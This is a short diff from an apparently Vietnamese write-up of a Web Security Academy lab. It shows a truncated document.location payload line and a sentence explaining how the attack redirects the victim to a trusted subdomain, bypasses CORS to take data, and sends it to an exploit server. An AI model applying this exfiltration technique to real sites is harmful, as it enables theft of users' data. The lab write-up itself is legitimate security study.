@@ -149,7 +149,7 @@ document.location= "http://stock.0aff00c10305751580ad308b00e7000a.web-security-a
 
 </details>
 
-$\implies$ Chuyển cửa sổ hiện tại của victim sang subdomain chứa script, ngay khi được kích hoạt, nó sẽ mượn danh nghĩa của subdomain để bypass CORS lấy dữ liệu, rồi tuồn về exploit server
+$/implies$ Chuyển cửa sổ hiện tại của victim sang subdomain chứa script, ngay khi được kích hoạt, nó sẽ mượn danh nghĩa của subdomain để bypass CORS lấy dữ liệu, rồi tuồn về exploit server
 
 \- Một số thứ cần chỉnh sửa:
 
